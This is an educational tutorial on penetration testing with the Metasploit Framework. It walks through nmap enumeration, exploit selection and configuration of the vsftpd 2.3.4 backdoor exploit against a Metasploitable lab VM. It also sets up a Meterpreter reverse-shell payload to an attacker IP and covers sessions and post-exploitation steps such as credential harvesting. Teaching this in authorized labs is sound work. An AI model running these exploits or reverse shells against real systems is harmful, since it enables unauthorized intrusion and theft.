1. Introduction

Hacking with Metasploit refers to using the Metasploit Framework to simulate real-world attacks in a controlled and authorized environment. This module focuses on how Metasploit is used during ethical hacking and penetration testing to exploit vulnerabilities, gain access, and assess security risks.

⚠️ This knowledge is strictly for educational and defensive purposes.

2. Role of Metasploit in Ethical Hacking

Metasploit is used to:

Validate discovered vulnerabilities

Simulate attacker behavior

Measure real-world impact

Improve defensive security controls

It turns theoretical vulnerabilities into practical proof.

3. Ethical Hacking Workflow with Metasploit

Reconnaissance

Scanning & Enumeration

Vulnerability Identification

Exploitation (Metasploit)

Post-Exploitation

Reporting

4. Target Enumeration Before Exploitation

Before hacking with Metasploit, attackers gather information using tools like:

Nmap (open ports & services)

Nikto (web vulnerabilities)

Gobuster (directories)

Nessus/OpenVAS (vulnerability scanning)

Example:

nmap -sV target_ip

5. Searching Vulnerabilities in Metasploit

Once a vulnerable service is identified:

msfconsole
search service_name
search cve:YYYY-NNNN


Example:

search vsftpd

6. Selecting an Exploit
use exploit/unix/ftp/vsftpd_234_backdoor
info


The info command helps understand:

Target OS

Required options

Payload compatibility

7. Configuring the Exploit
show options
set RHOSTS target_ip
set RPORT 21


Optional:

set LHOST attacker_ip
set LPORT 4444

8. Choosing a Payload

Common payloads used in hacking:

Reverse shell

Bind shell

Meterpreter

Example:

set PAYLOAD linux/x86/meterpreter/reverse_tcp

9. Launching the Exploit
exploit


or

run


If successful, a session is opened.

10. Gaining Shell Access

Once exploited, the attacker may get:

Command shell

Meterpreter shell

Example:

shell

11. Meterpreter-Based Hacking

Meterpreter allows advanced post-exploitation actions:

sysinfo
getuid
ps


Capabilities:

File access

Process migration

Privilege escalation

Network pivoting

12. Session Management

List active sessions:

sessions


Interact with a session:

sessions -i 1

13. Post-Exploitation Activities

After access is gained:

System enumeration

Credential harvesting

Privilege escalation checks

Persistence testing

(Only in authorized labs)

14. Common Attacks Performed with Metasploit

Exploiting outdated services

Weak authentication testing

Misconfigured services

Known CVE exploitation

15. Real-World Lab Example

Scenario:

Target: Metasploitable VM

Vulnerability: vsftpd 2.3.4

Tool: Metasploit

Outcome:

Successful exploit

Shell access

Vulnerability validated

Report generated

16. Risks of Using Metasploit Improperly

System crashes

Data loss

Detection by IDS/IPS

Legal consequences

17. Ethical and Legal Considerations

Hacking with Metasploit must be done:

With written permission

In lab environments

During professional assessments

Illegal hacking is punishable by law.

18. Safe Practice Environments

Recommended platforms:

Metasploitable

TryHackMe

Hack The Box

VulnHub

19. Difference Between Learning and Real Attacks
Learning (Ethical)	Real Attack (Illegal)
Authorized	Unauthorized
Educational	Criminal
Defensive goal	Malicious goal
20. Conclusion

Hacking with Metasploit is a core skill in penetration testing. When used responsibly, it helps security professionals understand attacker techniques, validate vulnerabilities, and strengthen defenses.
